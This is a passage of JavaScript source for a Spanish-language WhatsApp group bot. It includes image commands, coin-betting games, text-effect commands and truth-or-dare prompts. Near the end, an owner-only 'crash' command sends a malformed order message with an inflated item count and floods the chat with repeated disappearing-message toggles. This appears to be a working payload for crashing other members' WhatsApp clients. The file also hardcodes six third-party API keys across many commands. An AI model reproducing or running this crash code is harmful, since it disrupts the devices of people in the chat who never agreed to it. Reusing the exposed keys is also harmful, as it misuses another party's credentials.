const yao = ['https://i.ibb.co/6ttzZjP/16.jpg','https://i.ibb.co/Sy2xc1P/12.jpg','https://i.ibb.co/8d2m1gF/15.jpg','https://i.ibb.co/BsYb0xN/36.jpg','https://i.ibb.co/dtgLh00/2.jpg','https://i.ibb.co/GHz2Qdx/25.jpg','https://i.ibb.co/sFVs1bt/1.jpg','https://i.ibb.co/d2J2KDj/24.jpg','https://i.ibb.co/NVHpkWp/23.jpg','https://i.ibb.co/KxVB3wY/22.jpg','https://i.ibb.co/t3ytyh6/21.jpg','https://i.ibb.co/GVrKbYD/20.jpg','https://i.ibb.co/WDttFJK/19.jpg','https://i.ibb.co/517JFnF/18.jpg','https://i.ibb.co/zGRdbtZ/4.jpg','https://i.ibb.co/WVYF9JL/3.jpg','https://i.ibb.co/ZN7zsbk/5.jpg','https://i.ibb.co/WDDgvTq/28.jpg','https://i.ibb.co/vxfVSzy/27.jpg','https://i.ibb.co/RSkfN6D/26.jpg','https://i.ibb.co/wLzRyr2/13.jpg','https://i.ibb.co/HBpxR3v/17.jpg','https://i.ibb.co/1m19qTS/35.jpg','https://i.ibb.co/6vXpDm0/11.jpg','https://i.ibb.co/myvQCmx/34.jpg','https://i.ibb.co/pRPyw6Q/33.jpg','https://i.ibb.co/gZmRKNC/10.jpg','https://i.ibb.co/pJpcWtw/32.jpg','https://i.ibb.co/vH7DBc9/9.jpg','https://i.ibb.co/fCMMBt4/31.jpg','https://i.ibb.co/p49wLDJ/8.jpg','https://i.ibb.co/3Cft0R5/30.jpg','https://i.ibb.co/qYQgGQZ/7.jpg','https://i.ibb.co/0s5x61M/6.jpg','https://i.ibb.co/C8Nngyq/29.jpg','https://i.ibb.co/Np0VTVw/14.jpg']
let yaoii  = yao[Math.floor(Math.random() * yao.length)]   
yaoiii = await getBuffer(yaoii)           
cnf.sendMessage(from, yaoiii, image, {quote: mek, caption: 'Aquí tienes 💕🦈'})		       
addFilter(from)
break
					
case prefix+'todos':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					if (!isGroup) return reply(mess.only.group)
					var nom = mek.participant
					members_id = []
					teks = '\n'
					for (let mem of groupMembers) {
						teks += `├╼ @${mem.jid.split('@')[0]}\n`
						members_id.push(mem.jid)
					}
					mentions(`*▢ Grupo:*  ${groupName}\n*▢ Miembros:* ${groupMembers.length} \n*▢ Total De Admins:* ${groupAdmins.length}\n┌───⊷ *MENCIONES* ⊶`+teks+'└──✪ 🌸Watame-BOT🌸 ✪──⊷* ', members_id, true)
					addFilter(from)
          break

                        
case prefix+'wame':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())	

                   cnf.updatePresence(from, Presence.composing) 
      options = {
          text: `「 *LINK WHATSAPP* 」\n\nSolicitado por : @${sender.split("@s.whatsapp.net")[0]}\n\nSu link de Whatsapp : *https://wa.me/${sender.split("@s.whatsapp.net")[0]}*\n`,
          contextInfo: { mentionedJid: [sender] }
    }
    cnf.sendMessage(from, options, text, { quoted: mek } )
				addFilter(from)
          break

case prefix+'apostar':
if (!isRegistered) return reply(ind.noregis())
if (isBanned) return  reply(mess.banned)
dineroapostado = body.slice(9)
if (args.length < 1) return reply('¿Cuánto deseas apostar?')
  if(isNaN(dineroapostado)) return await reply('La cantidad debe ser un número')
  if(dineroapostado < 10) return await reply(`La apuesta debe ser mayor o igual a 10`)
  if(dineroapostado > 2000) return await reply(`Quién apuesta más de lo que puede ganar?`)
 const apuest = checkATMuser(sender)
if (apuest < dineroapostado) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, dineroapostado)
const gpp = ['10','10','10','10','5000']
	const gppp = gpp[Math.floor(Math.random() * gpp.length)]
piro = `*[💲] [ 𝗔𝗣𝗨𝗘𝗦𝗧𝗔𝗦 ] [💲]*

᭕- Dinero apostado :
᭕- ${dineroapostado}
᭕- Jugador :
᭕- ${pushname}

*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀??𝐎--{-💲}*
        ༊    PERDEDOR    ༊
*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎--{-💲}*

× No ganas nada
× Pierdes el dinero apostado

× Gracias por jugar`


ganadorxd = `*[💲] [ 𝗔𝗣𝗨𝗘𝗦𝗧𝗔𝗦 ] [💲]*

᭕- Dinero apostado :
᭕- ${dineroapostado}
᭕- Jugador :
᭕- ${pushname}

*{💲}---𝐑𝐄𝐒????𝐓𝐀𝐃𝐎--{-💲}*
        ༊     GANADOR     ༊
*{💲}---𝐑𝐄𝐒𝐔𝐋𝐓𝐀𝐃𝐎--{-💲}*

× Ganaste :
× 2000 coins

× Gracias por jugar`
if (gppp < 90) return reply(piro)
addKoinUser(sender, 2000)

reply(`${ganadorxd}`)
addFilter(from)
          break


case prefix+'coinflip':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

dineroapostadoo = args.join(" ")
if (dineroapostadoo < 1) return reply('¿Cuánto deseas apostar?')
if (dineroapostadoo > 501) return reply('La caja no puede pagar tanto :c')
  if(isNaN(dineroapostadoo)) return await reply('La cantidad debe ser un número')
const dap = checkATMuser(sender)
if (dap < dineroapostadoo) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, dineroapostadoo)
const cgn = ['5','10','5','10']
const ccgn = cgn[Math.floor(Math.random() * cgn.length)]

fli = `ᐅ La moneda aterrizo en: *CARA*.
Perdiste ${dineroapostadoo} coins`
if (ccgn < 7) return reply(fli)
fee = 3 * dineroapostadoo
addKoinUser(sender, fee)
flip = `ᐅ La moneda aterrizo en: *CRUZ*.
Ganaste ${fee} coins`
reply(flip)
addFilter(from)
          break

case prefix+'blood':   
if (isBanned) return  reply(mess.banned)  
if (!isRegistered) return reply(ind.noregis())			  

        
const apis9 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe9 = apis9[Math.floor(Math.random() * apis9.length)]
                bpp = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/bloodfrosted?apikey=${nepe9}&text=${bpp}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})                  
                  addFilter(from)
          break  
                  
case prefix+'blood2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())		
	  

           const apis8 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe8 = apis8[Math.floor(Math.random() * apis8.length)]     
                bpp1 = `${body.slice(8)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/horrorblood?apikey=${nepe8}&text=${bpp1}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})
                  
                  addFilter(from)
          break 
                   
case prefix+'bokeh':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())			  


           const apis7 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe7 = apis7[Math.floor(Math.random() * apis7.length)]     
                bpp2 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/bokeh?apikey=${nepe7}&text=${bpp2}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek})
                  
                  addFilter(from)
          break 
                   
case prefix+'toxic':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	
	
	  
const tox = checkATMuser(sender)
const toxx = [`${tox}`]
if (toxx < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
          const apis1 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe1 = apis1[Math.floor(Math.random() * apis1.length)]    
                bpp3 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/toxic?apikey=${nepe1}&text=${bpp3}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})        
                  addFilter(from)
          break 
                   
case prefix+'ice':
if (isBanned) return  reply(mess.banned)     
if (!isRegistered) return reply(ind.noregis())		

	  
 const icee = checkATMuser(sender)
const icce = [`${icee}`]
if (icce < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
const apis =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe = apis[Math.floor(Math.random() * apis.length)]                
                bpp5 = `${body.slice(5)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/icecold?apikey=${nepe}&text=${bpp5}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break  
                  
case prefix+'box':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())		
	  

 const boxx = checkATMuser(sender)
const boox = [`${boxx}`]
if (boox < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
       const apis2 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe22 = apis2[Math.floor(Math.random() * apis2.length)]        
                bpp4 = `${body.slice(5)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/box3d?apikey=${nepe22}&text=${bpp4}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break 
                   
case prefix+'love':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())	

 const loove = checkATMuser(sender)
const lovee = [`${loove}`]
if (lovee < 30) return reply(`𝐋𝐨 𝐬𝐢𝐞𝐧??𝐨 𝐜𝐨𝐢𝐧𝐬 𝐢𝐧𝐬𝐮𝐟𝐢𝐜𝐢𝐞𝐧𝐭𝐞𝐬.`)
confirmATM(sender, 30) 	
    const apis3 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe33 = apis3[Math.floor(Math.random() * apis3.length)]           
                bpp7 = `${body.slice(6)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/love?apikey=${nepe33}&text=${bpp7}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break  
                  
case prefix+'luxury':
if (isBanned) return  reply(mess.banned)      
if (!isRegistered) return reply(ind.noregis())		
	  

 const luux = checkATMuser(sender)
const luxx = [`${luux}`]
if (luxx < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
   const apis4 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe4 = apis4[Math.floor(Math.random() * apis4.length)]           
                bpp6 = `${body.slice(8)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/textprome/luxury?apikey=${nepe4}&text=${bpp6}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  
                  addFilter(from)
          break 
                   
case prefix+'love2':
if (isBanned) return  reply(mess.banned)
if (!isRegistered) return reply(ind.noregis())

			  
 const loovee = checkATMuser(sender)
const lovvve = [`${loovee}`]
if (lovvve < 30) return reply(`Lo siento, coins insuficientes`)
confirmATM(sender, 30) 	
            const apis5 =['7c6c9a9e1138b473e6c64388','ff8508e71c332b870c1e8a1b','b57c69801b7b3e63b3b3e94c','e07d2ff8ff95d995809ec7b3','99ae3d189586081a2be37357','8cd8a7918eab2510afd496c0']
 const nepe5 = apis5[Math.floor(Math.random() * apis5.length)]    
                bpp8 = `${body.slice(7)}`
                     if (args.length < 1) return reply('En dónde está el texto?')
                     if (args.length > 10) return reply('Maximo 10 letras')
                     
                     buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/lovemessage?apikey=${nepe5}&text=${bpp8}`, {method: 'get'})
                     cnf.sendMessage(from, buff, image, {quoted: mek, caption: 'Se te cobraron 30 coins'})
                  addFilter(from)
          break  
					
case prefix+'wpanime':
if (isBanned) return  reply(mess.banned)	      
if (!isRegistered) return reply(ind.noregis())	
if (!isBotGroupAdmins) return reply(mess.only.Badmin)		  				                                
const canuugti = ['https://i.ibb.co/sF5Fdt1/1d15523b5b93da72799e1c3b92ef5fef.jpg','https://i.ibb.co/17Lbj2j/44764f88fd4c43fb6db7c2d4e226ee9a.jpg','https://i.ibb.co/qBn79dv/041cf4ee7596e251cbe9b8d95ac69ab2.jpg','https://i.ibb.co/4WbBKXY/0580e84577023fcb3d7b65490be66f69.jpg','https://i.ibb.co/Fgxd6tS/cf3ff3a484d851fc077ef5e5c81c9d65.jpg','https://i.ibb.co/ZMBynRh/e7a7ddbeafa8c14e249691a7c3c4c0b2.jpg','https://i.ibb.co/KGL9m5g/dd40d5d0fe5b1df5097ca4400ae2ad16.jpg','https://i.ibb.co/ZMZYmKz/419b0bddd10310b8611653055ec8c7b0.jpg','https://i.ibb.co/jy8sgbh/c401a02422508128821921b31539091e.jpg','https://i.ibb.co/02M4h6S/5b1871bba0fb4b4e01c4356bdd93cd86.jpg','https://i.ibb.co/997FbVT/133053afa7ee650e45f782ce8475aed8.jpg','https://i.ibb.co/xzPvvDv/18cf2c41770f9edbbf31be8bec2fb0b2.jpg','https://i.ibb.co/HYn2B4Q/702c6cf7e374a02d1da0a5f794858a38.jpg','https://i.ibb.co/7nxQBkY/f2bcf894118518cd15fd69b033da78d1.jpg','https://i.ibb.co/yd61B8v/0d12c692d699ae3ff158d54d2fe02971.jpg','https://i.ibb.co/vD8HsGD/8dcea7573f193abf7ea26aefdc8f6949.jpg','https://i.ibb.co/1Z89RJT/ec77640a70d388ab3689b922b488e000.jpg','https://i.ibb.co/98bLyLD/6c54a7a35f7c3a3a974b15b0c9c666fa.jpg','https://i.ibb.co/nsxPVMx/d51a5164ed57c571de2f337823cdfe0d.jpg','https://i.ibb.co/r4QNhf1/e62aadd019b27bcc954f9f463a8a268d.jpg','https://i.ibb.co/Qfp7vS7/4838313f143a833ec931ac026665de39.jpg','https://i.ibb.co/fYqMq9T/a7134ce6fba2dc5efd9faa6fe4213444.jpg','https://i.ibb.co/ZN397Tk/06ebb4fbc32809c99f173b3ac5596c68.jpg','https://i.ibb.co/ZdCV7G8/cca874c663aeb20eed0baa477de679cc.jpg','https://i.ibb.co/s5TJN3L/5db7c137c1f672e15dc98910aef3a77a.jpg','https://i.ibb.co/r3k8sWQ/ca50357dd6a4638dd9199d02ac810828.jpg','https://i.ibb.co/h1tMDLD/e0e5d60bdfb0c93eb723a1d0e15d6756.jpg','https://i.ibb.co/3NXvXwR/d10db58ff9114e1575de143b723ddc9b.jpg','https://i.ibb.co/fMbJ33j/83850d24bd8312104701f3e93bdaa3e0.jpg','https://i.ibb.co/mcrsqsw/d65716315dc8cf5df3e438f6adf95c9e.jpg','https://i.ibb.co/hY3N02B/6bcee3571197465654c97683d0ed0e20.jpg','https://i.ibb.co/Js1sLBh/124d64ed1227aa1487a2c42b24f8837a.jpg','https://i.ibb.co/Kjc5NkN/993ccbdf49d7e1e256274cafc2585eef.jpg','https://i.ibb.co/p0sjxGX/3a741a4634e9445c5f93bf325b75ef2a.jpg','https://i.ibb.co/BqkFmY3/064bab224123321def4b21d224fe8e82.jpg','https://i.ibb.co/rfTwhXz/logo.jpg','https://i.ibb.co/H7C2bJD/7896dbb5d93ce36a81399c9e24e0e9fa.jpg','https://i.ibb.co/rbs9ZG0/506ab25382f022726b879c2fed3179a0.jpg','https://i.ibb.co/gj2JCZm/3d71bc19b7e56e23c94de9a2da33ba3e.jpg','https://i.ibb.co/WKZV6yG/79f8e21c88ca8044a2350024675d34ef.jpg','https://i.ibb.co/427Lj3L/7f6d1e9f9a4d3316c4f6834a2fe7ec32.jpg','https://i.ibb.co/R9SXJS1/7858da10a6d8dc3a7b3d06c437dcf5c7.jpg','https://i.ibb.co/BZwM4xL/32fb465027798249e815b5473ee0d210.jpg','https://i.ibb.co/7WX24j5/b91c79ea703cd93de96656ab60cdd789.jpg','https://i.ibb.co/K5bjZY2/bb6bbe2a3295c8539970c2111f239b4b.jpg','https://i.ibb.co/SVc69Dk/54b136d4d9a52df59901fc6c675cd960.jpg','https://i.ibb.co/Wxrmn1Z/0e6c1b49b5629101da59f06db122ad19.jpg','https://i.ibb.co/zFf5KFZ/6ed2bedc080a9e8c3b267d927433e7bf.jpg','https://i.ibb.co/6Zpkx7M/075d4b0ea4e6a5bac6085bbe9157ba37.jpg','https://i.ibb.co/Tq6YJyS/c0ebcbd97922d1271629ab87469dc0c7.jpg','https://i.ibb.co/RgVcvh8/be54e24e4a7276b1d3cc830a03fd4676.jpg','https://i.ibb.co/61G5nQb/6f8c4afef5b7ddf538447dc218ca0ef8.jpg','https://i.ibb.co/QdkJ0Y8/da76b20813815efd1dbf84116501b25a.jpg','https://i.ibb.co/S3pKHft/1ec2838d5cd0cd53eaface83a1bfa921.jpg','https://i.ibb.co/9GW77Vn/5983cbabf5827793558ee7fddbaf173f.jpg','https://i.ibb.co/WpbQWqH/74ba70dce0b89460129a05ed13380aa0.jpg','https://i.ibb.co/Bwh0MS4/8ea55d8ccaa10c5b3ff540e0e08f802e.jpg','https://i.ibb.co/2c1cymy/56142f816478a819ce32453a2f917af5.jpg','https://i.ibb.co/BGfjR8M/923f89fd65d33f823028ce2944a8fb77.jpg','https://i.ibb.co/TRMb2r3/9bef9de9f522d30de4ed4c07abd2de92.jpg']
let caanigtip = canuugti[Math.floor(Math.random() * canuugti.length)]
il = await getBuffer(caanigtip)
cnf.sendMessage(from, il, image, {quoted: mek, caption: 'Aquí tienes 💕🦈'})
await limitAdd(sender)                                     
addFilter(from)
break
					
    case prefix+'lesbi':
    if (isBanned) return  reply(mess.banned)
 if	(!isRegistered) return reply(ind.noregis())	
			
    const cuu =['Eres 0% Lesbi' , 'Eres 1% Lesbi' , 'Eres 2% Lesbi' , 'Eres 3% Lesbi' , 'Eres 4% Lesbi' , 'Eres 5% Lesbi' , 'Eres 6% Lesbi' , 'Eres 7% Lesbi' , 'Eres 8% Lesbi' , 'Eres 9% Lesbi' , 'Eres 10% Lesbi' , 'Eres 11% Lesbi' , 'Eres 12% Lesbi' , 'Eres 13% Lesbi' , 'Eres 14% Lesbi' , 'Eres 15% Lesbi' , 'Eres 16% Lesbi' , 'Eres 17% Lesbi' , 'Eres 18% Lesbi' , 'Eres 19% Lesbi' , 'Eres 20% Lesbi' , 'Eres 21% Lesbi' , 'Eres 22% Lesbi' , 'Eres 23% Lesbi' , 'Eres 24% Lesbi' , 'Eres 25% Lesbi' , 'Eres 26% Lesbi' , 'Eres 27% Lesbi' , 'Eres 28% Lesbi' , 'Eres 29% Lesbi' , 'Eres 30% Lesbi' , 'Eres 31% Lesbi' , 'Eres 32% Lesbi' , 'Eres 33% Lesbi' , 'Eres 34% Lesbi' , 'Eres 35% Lesbi' , 'Eres 36% Lesbi' , 'Eres 37% Lesbi' , 'Eres 38% Lesbi' , 'Eres 39% Lesbi' , 'Eres 40% Lesbi' , 'Eres 41% Lesbi' , 'Eres 42% Lesbi' , 'Eres 43% Lesbi' , 'Eres 44% Lesbi' , 'Eres 45% Lesbi' , 'Eres 46% Lesbi' , 'Eres 47% Lesbi' , 'Eres 48% Lesbi' , 'Eres 49% Lesbi' , 'Eres 50% Lesbi' , 'Eres 51% Lesbi' , 'Eres 52% Lesbi' , 'Eres 53% Lesbi' , 'Eres 54% Lesbi' , 'Eres 55% Lesbi' , 'Eres 56% Lesbi' , 'Eres 57% Lesbi' , 'Eres 58% Lesbi' , 'Eres 59% Lesbi' , 'Eres 60% Lesbi' , 'Eres 61% Lesbi' , 'Eres 62% Lesbi' , 'Eres 63% Lesbi' , 'Eres 64% Lesbi' , 'Eres 65% Lesbi' , 'Eres 66% Lesbi' , 'Eres 67% Lesbi' , 'Eres 68% Lesbi' , 'Eres 69% Lesbi' , 'Eres 70% Lesbi' , 'Eres 71% Lesbi' , 'Eres 72% Lesbi' , 'Eres 73% Lesbi' , 'Eres 74% Lesbi' , 'Eres 75% Lesbi' , 'Eres 76% Lesbi' , 'Eres 77% Lesbi' , 'Eres 78% Lesbi' , 'Eres 79% Lesbi' , 'Eres 80% Lesbi' , 'Eres 81% Lesbi' , 'Eres 82% Lesbi' , 'Eres 83% Lesbi' , 'Eres 84% Lesbi' , 'Eres 85% Lesbi' , 'Eres 86% Lesbi' , 'Eres 87% Lesbi' , 'Eres 88% Lesbi' , 'Eres 89% Lesbi' , 'Eres 90% Lesbi' , 'Eres 91% Lesbi' , 'Eres 92% Lesbi' , 'Eres 93% Lesbi' , 'Eres 94% Lesbi' , 'Eres 95% Lesbi' , 'Eres 96% Lesbi' , 'Eres 97% Lesbi' , 'Eres 98% Lesbi' , 'Eres 99% Lesbi' , 'Eres 100% Lesbi']														
  	const rii = cuu[Math.floor(Math.random() * cuu.length)]
					wnw = fs.readFileSync(`./src/5.jpg`)						
						cnf.sendMessage(from, wnw, image, { caption: '*Que tan lesbi eres*\n\n'+ rii, quoted: mek })
					addFilter(from)
          break                                      

							case prefix+'reto':
							if (isBanned) return  reply(mess.banned)
 if(!isRegistered) return reply(ind.noregis())
				
					const daare =['Te reto a poner en tu info de Whatsapp que te gusta Anuel por 24 horas','Te reto a decirle a tu crush que la amas y pasar cap en el grupo','Te reto a poner en tu estado que buscas pareja','Te reto a poner en tu perfil la foto de tu crush','Te reto a decirle a alguien que te gusta...','Te reto a mandar un audio cantando','Te reto mandar audio hablando con vos de niña de 5 años','Te reto a poner en tu info que te gusta tu vecin@','Te reto mandar una foto tuya sin taparte la cara','Te reto a decir que apodo tenias cuando eras un/a niñ@ aun','Te reto a enviar un vídeo bailando','Te reto a enviar el último meme que allas visto','Te reto a enviar tu canción favorita']
					const deer = daare[Math.floor(Math.random() * daare.length)]
				wbw = fs.readFileSync(`./src/4.jpg`)
							
						cnf.sendMessage(from, wbw, image, { quoted: mek, caption: '*Reto 😈*\n\n'+ deer })
					addFilter(from)
          break										
									case prefix+'verdad':
									if (isBanned) return  reply(mess.banned)
 if (!isRegistered) return reply(ind.noregis())		
		
					const trrut =['Con quien de los que están aqui en el grupo te besarías? (etiqueta)','¿Alguna vez te ha gustado alguien? ¿Cuanto tiempo?','Alunga vez te llegó a gustar el/la herman@ de tu mejor amig@?','Cuantos años tienes?','Cuanto tiempo ah pasado desde que diste tu último beso?','Te gustan los chicos o las chicas o ambos?','Que opinas sobre BTS','Que opinas sobre l@s administradores','Tienes novi@?','Cuantas veces te as sentido ignorad@ por tu pareja o insuficiente para el/ella?','Que opinas de la nueva política de Whatsapp?','Que opinas sobre Telegram?','Tienes canal de Youtube?','Que opinas sobre Este bot?','Que opinas sobre el grupo?','Que tal te parece esta función de verdad o reto?']
					const ttrrth = trrut[Math.floor(Math.random() * trrut.length)]
					wuw = fs.readFileSync(`./src/6.jpg`)						
						cnf.sendMessage(from, wuw, image, { caption: '*Verdad😇*\n\n'+ ttrrth, quoted: mek })
					addFilter(from)
          break
      
		    	case prefix+'antitrava':
		    	if (isBanned) return  reply(mess.banned)  
                if (!isRegistered) return reply(ind.noregis())			  
                if (!isGroup) return reply(`「 ❗ 」ESTE COMANDO SOLO PUEDE SER USADO EN GRUPOS`)
			    if (!isGroupAdmins) return reply(mess.only.admin)
				if (args.length < 1) return reply('「 ❗ 」 1 Para Activar, 0 Para Desactivar')
				if (Number(args[0]) === 1) {
				if (isTrava) return reply(`「 ❗ 」La Funcion De Antitrava Ya Esta Activada En El Grupo!!`)
				trava.push(from)
				fs.writeFileSync('./database/trava.json', JSON.stringify(trava))
				reply(`「 ❗ 」Activó con éxito la función Antitrava en este grupo`)
				} else if (Number(args[0]) === 0) {
				trava.splice(from, 1)
				fs.writeFileSync('./database/trava.json', JSON.stringify(trava))
				reply(`「 ❗ 」Deshabilitó Con Éxito La Función Antitrava En Este Grupo`)
				} else {
				reply('「 ❗ 」 1 Para Habilitar Y 0 Para Desactivar')
				}
				addFilter(from)
          break



 // BUG CRASH //
 
                     				case prefix+'crash': 
                     				if (isBanned) return  reply(mess.banned)
				if (!isOwner) return reply(mess.only.ownerB)
cnf.sendMessage(mek.key.remoteJid, '𝐂𝐫𝐚𝐬𝐡 𝐛𝐲 𝐂𝐨𝐧𝐟𝐮𝐌𝐨𝐝𝐬', MessageType.extendedText, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999, 
    status: 1,
    surface: 1,
    message: '𝐂𝐨𝐧𝐟𝐮𝐁𝐨𝐭𝟐',
    orderTitle: 'BY CONFUMODS ', // 
    sellerJid: '0@s.whatsapp.net' //
   }
  }
 }
})
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
cnf.toggleDisappearingMessages(from,`MODAR`,text)
addFilter(from)
          break




					case prefix+'crash2':
					if (!isOwner) return reply(mess.only.ownerB)
					if (isBanned) return  reply(mess.banned)
